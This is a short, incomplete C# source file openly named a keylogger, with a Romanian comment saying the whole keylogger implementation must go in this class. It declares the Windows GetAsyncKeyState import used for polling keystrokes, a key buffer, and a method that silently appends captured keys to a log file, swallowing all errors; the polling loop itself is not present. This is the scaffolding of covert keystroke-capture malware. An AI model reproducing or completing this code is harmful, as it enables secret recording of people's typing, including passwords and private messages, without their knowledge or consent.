using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Keylogger
{
    public class KeyLogger
    {
        // am incercat eu sa mut dar nu am timp, trebuie toata implementarea keylogger aici.
        string data = "";
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        StringBuilder keyBuffer;



        void CreateLog(string file)
        {
            try
            {
                StreamWriter sw = new StreamWriter(file, true);//I used true to append log to file

                sw.Write(keyBuffer.ToString());
                sw.Write(data.ToString());
                sw.Close();
                keyBuffer.Clear(); // reset buffer
            }
            catch
            {
            }
        }
    }
}
